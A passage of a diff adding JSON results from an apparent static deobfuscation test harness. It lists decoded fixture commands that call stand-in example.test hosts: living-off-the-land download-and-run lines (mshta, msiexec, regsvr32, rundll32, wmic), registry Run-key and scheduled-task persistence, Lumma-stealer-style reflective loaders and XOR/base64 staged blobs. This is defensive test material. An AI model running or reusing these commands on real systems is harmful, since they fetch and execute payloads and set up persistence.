+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 43,
+      "final_sha256": "688ae816a5b57bde7191293cb8de40b82937a586c31507557dd3d2bd0e0c77ff",
+      "final_text": "mshta.exe http://mshta-5.example.test/e.hta",
+      "fixture_id": "corpus_lolbas_mshta_005",
+      "implementation": "reference",
+      "latency_ms": 0.0031790114007890224,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 48,
+      "final_sha256": "0cc47e77d44d083468101c5abd6f16b0985817a199af68064ef3be0410be56fa",
+      "final_text": "msiexec /q /i http://msi-1.example.test/pkg1.msi",
+      "fixture_id": "corpus_lolbas_msiexec_001",
+      "implementation": "reference",
+      "latency_ms": 0.0032259849831461906,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 48,
+      "final_sha256": "6164029d9e9279c19689dd1e27c1893eee24fa9c78ee9c635637d75dc2bf95a8",
+      "final_text": "msiexec /q /i http://msi-2.example.test/pkg2.msi",
+      "fixture_id": "corpus_lolbas_msiexec_002",
+      "implementation": "reference",
+      "latency_ms": 0.003263005055487156,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 48,
+      "final_sha256": "63e4155d591f87b10873739707774e6743eb80dd2bba6095b8cd7a7999edcf45",
+      "final_text": "msiexec /q /i http://msi-3.example.test/pkg3.msi",
+      "fixture_id": "corpus_lolbas_msiexec_003",
+      "implementation": "reference",
+      "latency_ms": 0.0032939715310931206,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 48,
+      "final_sha256": "c053bc2e99de0a88d50dcccd5eba0acf08221ad77a4185d5f892105d2e4f3d8e",
+      "final_text": "msiexec /q /i http://msi-4.example.test/pkg4.msi",
+      "fixture_id": "corpus_lolbas_msiexec_004",
+      "implementation": "reference",
+      "latency_ms": 0.003904977347701788,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 48,
+      "final_sha256": "f251aa19508fe401a093f413d23d47a1058bdcceb7ba9fd3ef7aa7ff3b89547d",
+      "final_text": "msiexec /q /i http://msi-5.example.test/pkg5.msi",
+      "fixture_id": "corpus_lolbas_msiexec_005",
+      "implementation": "reference",
+      "latency_ms": 0.004843983333557844,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 184,
+      "final_sha256": "67c1e043950be9f3c7b0c38a31bd4a1e939ebd51a1978d4fc3d52cd8aeee2096",
+      "final_text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdaterY /t REG_SZ /d \"powershell -w hidden -c iwr http://reg-1.example.test/r1.exe -o %TEMP%\\r.exe;start %TEMP%\\r.exe\" /f",
+      "fixture_id": "corpus_lolbas_reg_run_001",
+      "implementation": "reference",
+      "latency_ms": 0.01667899778112769,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 184,
+      "final_sha256": "1423a21888f0a93a3100a5bdea5d403c16a58ce351e8f13b4adc48e150ae858e",
+      "final_text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdaterY /t REG_SZ /d \"powershell -w hidden -c iwr http://reg-2.example.test/r2.exe -o %TEMP%\\r.exe;start %TEMP%\\r.exe\" /f",
+      "fixture_id": "corpus_lolbas_reg_run_002",
+      "implementation": "reference",
+      "latency_ms": 0.014887016732245684,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 184,
+      "final_sha256": "d200ec16399aaad7187fc76389d650d62112507a3169f8e25b0624aaf6259e7d",
+      "final_text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdaterY /t REG_SZ /d \"powershell -w hidden -c iwr http://reg-3.example.test/r3.exe -o %TEMP%\\r.exe;start %TEMP%\\r.exe\" /f",
+      "fixture_id": "corpus_lolbas_reg_run_003",
+      "implementation": "reference",
+      "latency_ms": 0.014372984878718853,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 184,
+      "final_sha256": "12c77815e910c52996c7fbe623ad6b33e6b852c6cfe352fa4e6514846563f21d",
+      "final_text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdaterY /t REG_SZ /d \"powershell -w hidden -c iwr http://reg-4.example.test/r4.exe -o %TEMP%\\r.exe;start %TEMP%\\r.exe\" /f",
+      "fixture_id": "corpus_lolbas_reg_run_004",
+      "implementation": "reference",
+      "latency_ms": 0.014466000720858574,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 184,
+      "final_sha256": "1d16a896d5be06fb09d93c2a62e0fdaa0b389df176ba0a7b74ae71cb031277f6",
+      "final_text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdaterY /t REG_SZ /d \"powershell -w hidden -c iwr http://reg-5.example.test/r5.exe -o %TEMP%\\r.exe;start %TEMP%\\r.exe\" /f",
+      "fixture_id": "corpus_lolbas_reg_run_005",
+      "implementation": "reference",
+      "latency_ms": 0.014969962649047375,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 66,
+      "final_sha256": "4951785f785cbeec90ca4df5af293f3a4739b3657cb81fa7443e209fb6b4b342",
+      "final_text": "regsvr32 /s /n /u /i:http://regsvr-1.example.test/a.sct scrobj.dll",
+      "fixture_id": "corpus_lolbas_regsvr32_001",
+      "implementation": "reference",
+      "latency_ms": 0.004435016307979822,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 66,
+      "final_sha256": "2fa40403eb0a4e97f9d5fbb38b8d191846cb08e1b25058cc0391356e3ea11b9d",
+      "final_text": "regsvr32 /s /n /u /i:http://regsvr-2.example.test/b.sct scrobj.dll",
+      "fixture_id": "corpus_lolbas_regsvr32_002",
+      "implementation": "reference",
+      "latency_ms": 0.004558998625725508,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 66,
+      "final_sha256": "8b0e0dbd12f7fb21afbb5a3a17ab7c58ee7bf743a460c53b68e508d01c7a52d7",
+      "final_text": "regsvr32 /s /n /u /i:http://regsvr-3.example.test/c.sct scrobj.dll",
+      "fixture_id": "corpus_lolbas_regsvr32_003",
+      "implementation": "reference",
+      "latency_ms": 0.004797009751200676,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 66,
+      "final_sha256": "1c087b046133cfac4d08ce33001ef22dfd88e5ff430aadd884e525773df1a796",
+      "final_text": "regsvr32 /s /n /u /i:http://regsvr-4.example.test/d.sct scrobj.dll",
+      "fixture_id": "corpus_lolbas_regsvr32_004",
+      "implementation": "reference",
+      "latency_ms": 0.0046140048652887344,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 66,
+      "final_sha256": "b43ad7ea2bd91e2a020cf8d0e40543f2e60dafe1bd3540e5e050d63f6cdcd740",
+      "final_text": "regsvr32 /s /n /u /i:http://regsvr-5.example.test/e.sct scrobj.dll",
+      "fixture_id": "corpus_lolbas_regsvr32_005",
+      "implementation": "reference",
+      "latency_ms": 0.004607019945979118,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 63,
+      "final_sha256": "bf662bea462993f9c7ef403b53ad34dd1b899d2a78c5cfbf421643b9c5f63008",
+      "final_text": "rundll32.exe url.dll,OpenURL http://rundll-1.example.test/x.dll",
+      "fixture_id": "corpus_lolbas_rundll32_001",
+      "implementation": "reference",
+      "latency_ms": 0.004864006768912077,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 63,
+      "final_sha256": "29d37520f66f0b97738eaad5cb9b0231d88c5750245fad5af0fcecefe8d18545",
+      "final_text": "rundll32.exe url.dll,OpenURL http://rundll-2.example.test/y.dll",
+      "fixture_id": "corpus_lolbas_rundll32_002",
+      "implementation": "reference",
+      "latency_ms": 0.004433037247508764,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 63,
+      "final_sha256": "f1efda712be1032b6fb3899fb332dbbd7854e0433f7cf037bd15dd2bb6eab87b",
+      "final_text": "rundll32.exe url.dll,OpenURL http://rundll-3.example.test/z.dll",
+      "fixture_id": "corpus_lolbas_rundll32_003",
+      "implementation": "reference",
+      "latency_ms": 0.004115048795938492,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 63,
+      "final_sha256": "c6f866f03db8001404a5cab7628e46be2fe627ad4030645f8e9ee1d04ec2314f",
+      "final_text": "rundll32.exe url.dll,OpenURL http://rundll-4.example.test/a.dll",
+      "fixture_id": "corpus_lolbas_rundll32_004",
+      "implementation": "reference",
+      "latency_ms": 0.003980996552854776,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 63,
+      "final_sha256": "ab518c934ea1deb4be417f564aa46ce66b6e5b43ad7b395f4e2e4408dd97f100",
+      "final_text": "rundll32.exe url.dll,OpenURL http://rundll-5.example.test/b.dll",
+      "fixture_id": "corpus_lolbas_rundll32_005",
+      "implementation": "reference",
+      "latency_ms": 0.003992987331002951,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 128,
+      "final_sha256": "ef59b695b36539b7261c5a5e20ee16dc246baff1f27b74592e663e50d81b6cf9",
+      "final_text": "schtasks /create /sc onlogon /tn UpdaterX /tr \"powershell -w hidden -c iwr http://sch-1.example.test/u1.exe -o %TEMP%\\up.exe\" /f",
+      "fixture_id": "corpus_lolbas_schtasks_001",
+      "implementation": "reference",
+      "latency_ms": 0.011045951396226883,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 128,
+      "final_sha256": "8f08952e9c5d1db328e02f0f98bfa2f11985a42c6fe86fbd2e2733df04cb63f4",
+      "final_text": "schtasks /create /sc onlogon /tn UpdaterX /tr \"powershell -w hidden -c iwr http://sch-2.example.test/u2.exe -o %TEMP%\\up.exe\" /f",
+      "fixture_id": "corpus_lolbas_schtasks_002",
+      "implementation": "reference",
+      "latency_ms": 0.010450952686369419,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 128,
+      "final_sha256": "8af78eba00fcae13bfe1247ef28f629646bf5dda1f30880d1fb7c22d04175730",
+      "final_text": "schtasks /create /sc onlogon /tn UpdaterX /tr \"powershell -w hidden -c iwr http://sch-3.example.test/u3.exe -o %TEMP%\\up.exe\" /f",
+      "fixture_id": "corpus_lolbas_schtasks_003",
+      "implementation": "reference",
+      "latency_ms": 0.010326970368623734,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 128,
+      "final_sha256": "a7316ca3604ef4e3496477ddcc18c48d2236d2d55ae4eb3e35180adcfa9c89ae",
+      "final_text": "schtasks /create /sc onlogon /tn UpdaterX /tr \"powershell -w hidden -c iwr http://sch-4.example.test/u4.exe -o %TEMP%\\up.exe\" /f",
+      "fixture_id": "corpus_lolbas_schtasks_004",
+      "implementation": "reference",
+      "latency_ms": 0.010527030099183321,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 128,
+      "final_sha256": "15f72ba32835b59c3076bcb0b08359c890dfb4bd96c12027d2e296c73fa02478",
+      "final_text": "schtasks /create /sc onlogon /tn UpdaterX /tr \"powershell -w hidden -c iwr http://sch-5.example.test/u5.exe -o %TEMP%\\up.exe\" /f",
+      "fixture_id": "corpus_lolbas_schtasks_005",
+      "implementation": "reference",
+      "latency_ms": 0.010351999662816525,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 100,
+      "final_sha256": "a3c5f18e2c80d4ba27836295a4b98e05d2248d8f3404977e7c22edd8b81b63b0",
+      "final_text": "wmic process call create \"powershell -w hidden -c iex (iwr 'http://wmi-1.example.test/a.ps1' -useb)\"",
+      "fixture_id": "corpus_lolbas_wmic_001",
+      "implementation": "reference",
+      "latency_ms": 0.008672999683767557,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 100,
+      "final_sha256": "4610c95e0eecf53233b3d894f6cc6d0a68636cf9cd42beaa60e02919c2b24e9b",
+      "final_text": "wmic process call create \"powershell -w hidden -c iex (iwr 'http://wmi-2.example.test/b.ps1' -useb)\"",
+      "fixture_id": "corpus_lolbas_wmic_002",
+      "implementation": "reference",
+      "latency_ms": 0.00859296415001154,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 100,
+      "final_sha256": "ecc3a2fb4bef12b6a3556c4b228190600411b66222833274c5b5ce317e3d2d17",
+      "final_text": "wmic process call create \"powershell -w hidden -c iex (iwr 'http://wmi-3.example.test/c.ps1' -useb)\"",
+      "fixture_id": "corpus_lolbas_wmic_003",
+      "implementation": "reference",
+      "latency_ms": 0.008773000445216894,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 100,
+      "final_sha256": "aaf3bcb731a321f7b52d60b5ea442a20a0ba2f80fe811c6f09729fe54e3a5164",
+      "final_text": "wmic process call create \"powershell -w hidden -c iex (iwr 'http://wmi-4.example.test/d.ps1' -useb)\"",
+      "fixture_id": "corpus_lolbas_wmic_004",
+      "implementation": "reference",
+      "latency_ms": 0.00831700162962079,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 100,
+      "final_sha256": "13208c1f06b79405606dc63d510cc02262382becbd118caf41a02391bdd74a97",
+      "final_text": "wmic process call create \"powershell -w hidden -c iex (iwr 'http://wmi-5.example.test/e.ps1' -useb)\"",
+      "fixture_id": "corpus_lolbas_wmic_005",
+      "implementation": "reference",
+      "latency_ms": 0.008448027074337006,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 199,
+      "final_sha256": "5eec625968ebb39cdf53f846a28d786739e5cb83b4535cd8963f33cdcb6b7d00",
+      "final_text": "$c=New-Object Net.WebClient; $c.Headers.Add('X-Build','AB12CD34'); $b=$c.DownloadData('http://lumma-c2-1.example.test/api/gate'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_lumma_stealer_001",
+      "implementation": "reference",
+      "latency_ms": 0.04923302913084626,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 573,
+          "bytes_out": 199,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 197,
+      "final_sha256": "8213b1a742c9c1dc6115a3eb4e83fb3566f10542291c7505bc3187b0bc0b3ea5",
+      "final_text": "$c=New-Object Net.WebClient; $c.Headers.Add('X-Build','EF56GH78'); $b=$c.DownloadData('http://lumma-c2-2.example.test/beacon'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_lumma_stealer_002",
+      "implementation": "reference",
+      "latency_ms": 0.04101003287360072,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 569,
+          "bytes_out": 197,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 198,
+      "final_sha256": "e0b5799970e6b4d0a6505ab86e7b5a4fcce812ab577f950418c6a3e1dc2fed3f",
+      "final_text": "$c=New-Object Net.WebClient; $c.Headers.Add('X-Build','IJ90KL12'); $b=$c.DownloadData('http://lumma-c2-3.example.test/collect'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_lumma_stealer_003",
+      "implementation": "reference",
+      "latency_ms": 0.038130965549498796,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 569,
+          "bytes_out": 198,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 196,
+      "final_sha256": "906824a4c8ae61d7429e94803c36709203008083a96938d307a6c9e2be366397",
+      "final_text": "$c=New-Object Net.WebClient; $c.Headers.Add('X-Build','MN34OP56'); $b=$c.DownloadData('http://lumma-c2-4.example.test/exfil'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_lumma_stealer_004",
+      "implementation": "reference",
+      "latency_ms": 0.039346981793642044,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 565,
+          "bytes_out": 196,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 200,
+      "final_sha256": "2b12e65ba22c924b8076cf7af29d324d32f5d626ada427da9a59110a5a325adc",
+      "final_text": "$c=New-Object Net.WebClient; $c.Headers.Add('X-Build','QR78ST90'); $b=$c.DownloadData('http://lumma-c2-5.example.test/handshake'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_lumma_stealer_005",
+      "implementation": "reference",
+      "latency_ms": 0.03989401739090681,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 577,
+          "bytes_out": 200,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 152,
+      "final_sha256": "2c6ace0d83e950af279ca8dade648fa52cc613a3c045db0a109bc266d37448bb",
+      "final_text": "$p='DpoZEbZyRnsT7uJlnEHB2T0+Q0HeOTg4ocPG3jzHJMVavFndPNlYxDpYPD/AXidDRsE8PF9cwxUR85TTYjwRERE='; # xor-key 0x11  # multi-stage: b64 → xor → gz → iex",
+      "fixture_id": "corpus_multi_stage_b64_gz_xor_001",
+      "implementation": "reference",
+      "latency_ms": 0.010978023055940866,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 152,
+      "final_sha256": "ee08c5bdc3ed6aca9c329d9d337a5f86e8ff6c1eb2dcd40b7473964caf83711c",
+      "final_text": "$p='PakqIoVBdUgg3dFWr3Ly6g4NcHLtCgsLkvD17Q/0F/Bpj2ruD+pr9wlrDwzzbRRwdfIPD2xv8CYikxENZA8iIiI='; # xor-key 0x22  # multi-stage: b64 → xor → gz → iex",
+      "fixture_id": "corpus_multi_stage_b64_gz_xor_002",
+      "implementation": "reference",
+      "latency_ms": 0.009435985703021288,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 152,
+      "final_sha256": "be86f852afa73bcea12ff86d6fadd171370fbf4a894cce6666b6b212c8df588a",
+      "final_text": "$p='LLg7M5RQZFkxzMBHvmPj+x8cYWP8Gxoag+Hk/B7lBuV4nnv/Hvt65hh6Hh3ifAVhZOMeHn1+4TczjJCX0B4zMzM='; # xor-key 0x33  # multi-stage: b64 → xor → gz → iex",
+      "fixture_id": "corpus_multi_stage_b64_gz_xor_003",
+      "implementation": "reference",
+      "latency_ms": 0.00847596675157547,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 152,
+      "final_sha256": "fb7660e16c23ed69dbacbd530a7a85495abe4791315d91200b417462fb5f4e98",
+      "final_text": "$p='W89MROMnEy5Gu7cwyRSUjGhrFhSLbG1t9JaTi2mScZUP6QyIaYwNkW8NaWqVC3IWE5RpaQoJlkBEUxuwaWlEREQ='; # xor-key 0x44  # multi-stage: b64 → xor → gz → iex",
+      "fixture_id": "corpus_multi_stage_b64_gz_xor_004",
+      "implementation": "reference",
+      "latency_ms": 0.008823990356177092,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 152,
+      "final_sha256": "1bae2ffd3e58271fcbedad9fb8c79b2d5f26fe3d7e923c29e4d83beb8a1e92e0",
+      "final_text": "$p='St5dVfI2Aj9XqqYh2AWFnXl6BwWafXx85YeCmniDYIAe+B2ZeJ0cgH4ceHuEGmMHAoV4eBsYh1FVTJoq3XhVVVU='; # xor-key 0x55  # multi-stage: b64 → xor → gz → iex",
+      "fixture_id": "corpus_multi_stage_b64_gz_xor_005",
+      "implementation": "reference",
+      "latency_ms": 0.008676957804709673,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 45,
+      "final_sha256": "0086b66d68d9fb0c6093c47c15c1b8a4d73669009f7832f733e951b738d89099",
+      "final_text": "\\111\\105\\130\\40\\47\\142\\145\\156\\151\\147\\156\\47",
+      "fixture_id": "corpus_octal_ascii_001",
+      "implementation": "reference",
+      "latency_ms": 0.00443396857008338,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 46,
+      "final_sha256": "fbfd4b571723917cdff506ca6b873e767f56fe6170b548fdc62dd37caeaf01b8",
+      "final_text": "\\167\\150\\157\\141\\155\\151\\40\\57\\160\\162\\151\\166",
